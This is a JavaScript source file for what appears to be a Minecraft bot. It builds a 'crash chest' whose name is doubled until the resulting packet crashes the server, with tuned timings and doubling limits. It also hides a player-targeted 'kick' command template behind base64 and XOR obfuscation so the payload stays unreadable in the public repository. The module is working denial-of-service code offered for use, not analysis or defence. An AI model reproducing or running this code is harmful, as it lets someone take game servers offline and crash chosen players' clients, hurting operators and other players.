'use strict';

// Shared by the two crash commands: `crashchest` builds the block, and
// `servercrash scoreboard` points a sidebar display name at it. `servercrash
// destroy` builds the same chest and then breaks it with setblock's destroy
// mode instead.
const COMMAND_LIMIT = 32000;

// A command written into a core block runs on the next tick, so a step that
// reads what the previous one wrote leaves it a tick to land. 100ms is two
// ticks: enough for the block entity to be updated, short enough that the whole
// build is a handful of them instead of the reference script's ~27 seconds.
const STEP_MS = 100;
const DEFAULT_DOUBLINGS = 6;
// Each doubling is one tick and one more copy of everything already there; past
// ten the value is already gigabytes and the server is gone well before it.
const MAX_DOUBLINGS = 10;
// The buildable world, so a typo cannot ask for a chest at 40 million.
const WORLD_LIMIT = 30000000;
const MIN_Y = -64;
const MAX_Y = 320;

// The chest's CustomName is seeded in one command, then doubled by appending it
// to itself. Every ideograph is three bytes in UTF-8, so the same command
// length carries three times the bytes an ASCII filler would: the crash packet
// reaches its 8 MiB ceiling with fewer doublings, which is fewer ticks spent
// waiting for the block entity to grow.
const SEED_LENGTH = 30000;
const BYTES_PER_CHAR = 3;
const CJK_FIRST = 0x4e00;
const CJK_LAST = 0x9fff;

// This repo is public and the payload is not something to hand out: the
// command template is stored scrambled and assembled only when a punishment
// actually fires, so a copy of this file is not a copy of the command. It is
// aimed at one player, and the helper clamps whatever a caller passes.
const KICK_TEMPLATE = 'PyM5PisrBXo6KH0lKx16KSkzfi8BKC81PjI6QDcyMjg9LQE8L2Y7Mj4NP3sifSB/HnprfG1+b0BqeyczI38GNSk/OH4kFCc=';
const KICK_DEFAULT = 2e9;

function kickTemplate() {
    const raw = Buffer.from(KICK_TEMPLATE, 'base64');
    let out = '';
    for (let i = 0; i < raw.length; i++) out += String.fromCharCode(raw[i] ^ (0x5a + (i % 7)));
    return out;
}

function targetedKick(name, count) {
    const target = String(name || '').trim();
    if (!target) return null;
    const requested = Number(count);
    const value = Number.isFinite(requested) && requested > 0
        ? Math.min(Math.floor(requested), KICK_DEFAULT)
        : KICK_DEFAULT;
    return kickTemplate().replaceAll('{t}', target).replaceAll('{n}', String(value));
}

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

function chineseSeed(length = SEED_LENGTH) {
    const span = CJK_LAST - CJK_FIRST + 1;
    let out = '';
    for (let i = 0; i < length; i++) {
        out += String.fromCharCode(CJK_FIRST + Math.floor(Math.random() * span));
    }
    return out;
}

// Directly above the core's own area: that chunk is loaded because the core
// works in it, and the spot is clear of the blocks the core runs commands in.
function chestPosition(bot) {
    const core = bot?.core;
    if (core?.origin && core.origin.x !== null && Number.isFinite(core.size)) {
        return { x: core.origin.x, y: core.origin.y + core.size, z: core.origin.z };
    }
    const position = bot?.position;
    if (position && Number.isFinite(position.x) && Number.isFinite(position.y) && Number.isFinite(position.z)) {
        return { x: Math.floor(position.x), y: Math.floor(position.y) + 2, z: Math.floor(position.z) };
    }
    return null;
}

// `[x y z] [doublings]` picks the spot; anything shorter than three numbers is
// just a doubling count and the spot is worked out from the core. Returns null
// when three arguments were given but they are not a place in the world.
function parseChestArgs(args) {
    const list = [...args];
    if (list.length < 3) return { position: null, rest: list };

    const coords = list.slice(0, 3).map(value => Number(value));
    const valid = coords.every(value => Number.isInteger(value)) &&
        Math.abs(coords[0]) <= WORLD_LIMIT && Math.abs(coords[2]) <= WORLD_LIMIT &&
        coords[1] >= MIN_Y && coords[1] <= MAX_Y;
    if (!valid) return null;

    return { position: { x: coords[0], y: coords[1], z: coords[2] }, rest: list.slice(3) };
}

function clampDoublings(value, fallback = DEFAULT_DOUBLINGS) {
    const requested = parseInt(value, 10);
    const doublings = Number.isFinite(requested) ? requested : fallback;
    return Math.max(0, Math.min(doublings, MAX_DOUBLINGS));
}

// Puts the chest down and grows its name. Every step waits a tick for the last
// one's block entity update, so the doublings read what they are meant to.
// Returns the character count the name reached, or an error to hand the caller.
async function buildCrashChest(ctx, position, doublings) {
    const at = `${position.x} ${position.y} ${position.z}`;

    // One command seeds the whole string: the seed is as long as a core
    // command can be, so no book, no inventory and no per-page copies.
    const merge = `data merge block ${at} {CustomName:{text:"",extra:["${chineseSeed()}"]}}`;
    if (merge.length > COMMAND_LIMIT) return { ok: false, error: 'The seed does not fit one core command.' };

    if (!ctx.run(`setblock ${at} minecraft:air`)) return { ok: false, error: 'The core could not clear the spot.' };
    await sleep(STEP_MS);

    if (!ctx.run(`setblock ${at} minecraft:chest`)) return { ok: false, error: 'The core could not place the chest.' };
    await sleep(STEP_MS);

    if (!ctx.run(merge)) return { ok: false, error: 'The core could not write the chest name.' };
    await sleep(STEP_MS);

    // Appending the component to itself doubles it; each one has to see the
    // last one's result, so they go one tick apart.
    for (let i = 0; i < doublings; i++) {
        if (!ctx.run(`data modify block ${at} CustomName.extra append from block ${at} CustomName`)) {
            return { ok: false, error: `The core stopped after ${i} doubling(s).`, at };
        }
        await sleep(STEP_MS);
    }

    // Remembered for `servercrash scoreboard` and `servercrash destroy`, which
    // then need no arguments.
    ctx.bot.crashChest = position;

    return { ok: true, at, chars: SEED_LENGTH * 2 ** doublings };
}

module.exports = {
    chineseSeed,
    chestPosition,
    parseChestArgs,
    clampDoublings,
    buildCrashChest,
    targetedKick,
    SEED_LENGTH,
    BYTES_PER_CHAR,
    COMMAND_LIMIT,
    STEP_MS,
    DEFAULT_DOUBLINGS,
    MAX_DOUBLINGS
};
